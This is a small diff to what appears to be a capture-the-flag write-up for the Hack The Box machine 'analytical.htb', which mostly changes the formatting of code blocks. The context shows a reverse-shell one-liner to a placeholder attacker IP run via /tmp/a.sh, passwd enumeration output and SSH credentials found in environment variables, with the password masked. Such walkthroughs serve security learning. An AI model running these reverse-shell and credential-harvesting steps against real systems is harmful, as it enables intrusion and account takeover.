@@ -81,11 +81,12 @@ echo 'sh -i >& /dev/tcp/<Attacker IP add>/4445 0>&1' > /tmp/a.sh
 bash /tmp/a.sh
 ```
 #### after some basic enumeration got the /bin/ash users as well some ssh creds at env variables 
+```
 root:x:0:0:root:/root:/bin/ash
 metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash
 META_USER=metalytics
-META_PASS=*************** <!-- to get the password practice what we have done -->
-
+META_PASS=*************** # to get the password practice what we have done.
+```
 -------------------------------------------------------------------------------------------------------------------------
 ```
 ssh metalytics@analytical.htb 
